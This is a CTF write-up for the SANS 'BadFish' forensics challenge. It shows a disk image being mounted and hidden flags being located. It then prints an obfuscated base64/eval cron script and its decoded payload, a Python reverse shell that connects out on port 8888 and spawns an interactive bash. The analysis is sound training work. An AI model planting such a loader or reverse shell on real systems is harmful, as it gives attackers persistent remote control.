---
title: 2024 SANS Offensive Operation CTF - BadFish::002-004
date: 2024-02-28T07:00:00-07:00
tags:
  - img
image: 
---

### Summary
```
Uh Oh it seems a few bad fish got into the fish tank!

Can you find them all?

Zip Password: bAdFi5h

DISCLAIMER: Flag will start with the number of the challenge it belongs to.

```

### Steps

I first started by mounting the img file.
```bash
sudo mount -o loop,offset=$((2048 * 512)) badfish.img /mnt/bf
```

Next, I started to enumerate the the files and discovered the second flag in /home/nemo/.bashrc.

![](/2024sansctf/badfish002.png)

Moving forward, I discovered the third flag ini the `/usr/bin/` directory as a suspected binary called `3_5tr1nGs_r_BaD_4_f15H`.


![](/2024sansctf/badfish003.png)

The last flag was setup as a cron job and stored in `/tmp/.d/daily.py`

```python
import base64

test = ""
for i in ['YmFzZTY0LmI2NGRlY29kZSgnQ21aeWI=', 'MjBnYjNNZ2FXMXdiM0owSUdSMWNESUs=', 'Wm5KdmJTQnpkV0p3Y205alpYTnpJR2w=', 'dGNHOXlkQ0J5ZFc0S2FXMXdiM0owSUg=', 'TnZZMnRsZEFwelBYTnZZMnRsZEM1emI=', 'Mk5yWlhRb2MyOWphMlYwTGtGR1gwbE8=', 'UlZRc2MyOWphMlYwTGxOUFEwdGZVMVI=', 'U1JVRk5LUXB6TG1OdmJtNWxZM1FvS0M=', 'STBYelZ1TTJGcmVWODFia1ZoYTFraUw=', 'RGc0T0RncEtRcGtkWEF5S0hNdVptbHM=', 'Wlc1dktDa3NNQ2tLWkhWd01paHpMbVo=', 'cGJHVnVieWdwTERFcENtUjFjRElvY3k=', 'NW1hV3hsYm04b0tTd3lLUXB5ZFc0b1c=', 'eUl2WW1sdUwySmhjMmdpTENJdGFTSmQ=', 'S1FvPScp']:
    test = test + base64.b64decode(i).decode()
eval(test)
```

I modified the python script to include `print(test)` when executing it. 
```python
python3 ./daily.py                                                                                  
base64.b64decode('CmZyb20gb3MgaW1wb3J0IGR1cDIKZnJvbSBzdWJwcm9jZXNzIGltcG9ydCBydW4KaW1wb3J0IHNvY2tldApzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCI0XzVuM2FreV81bkVha1kiLDg4ODgpKQpkdXAyKHMuZmlsZW5vKCksMCkKZHVwMihzLmZpbGVubygpLDEpCmR1cDIocy5maWxlbm8oKSwyKQpydW4oWyIvYmluL2Jhc2giLCItaSJdKQo=')
```

Base64 decoding that strinig gave me the following reverse shell including the flag.
```python
from os import dup2
from subprocess import run
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("4_5n3aky_5nEakY",8888))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
run(["/bin/bash","-i"])
```
